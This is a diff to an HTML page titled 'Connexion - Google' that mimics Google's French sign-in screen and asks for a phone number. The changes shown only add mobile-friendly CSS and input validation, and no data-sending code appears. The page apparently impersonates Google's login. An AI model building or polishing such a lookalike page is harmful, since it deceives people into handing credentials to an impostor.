@@ -4,22 +4,31 @@
   <meta charset="UTF-8" />
   <title>Connexion - Google</title>
   <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
+      height: 100%;
       background: #fff;
       font-family: 'Roboto', Arial, sans-serif;
+      color: #202124;
+    }
+    body {
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      height: 100vh;
       padding-top: 120px;
-      color: #202124;
+      box-sizing: border-box;
+      min-height: 100vh;
+      /* Évite le scroll horizontal sur mobile */
+      overflow-x: hidden;
     }
     .container {
       width: 360px;
+      max-width: 90vw;
       text-align: center;
     }
     .google-logo {
@@ -78,6 +87,15 @@
       font-size: 12px;
       color: #5f6368;
     }
+    @media (max-width: 400px) {
+      body {
+        padding-top: 80px;
+      }
+      .container {
+        width: 100%;
+        padding: 0 20px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -97,6 +115,8 @@
       autocomplete="tel"
       aria-label="Numéro de téléphone"
       autofocus
+      pattern="^\+?[0-9\s\-]{6,20}$"
+      required
     />
     <button id="submitBtn" type="button">Suivant</button>
 
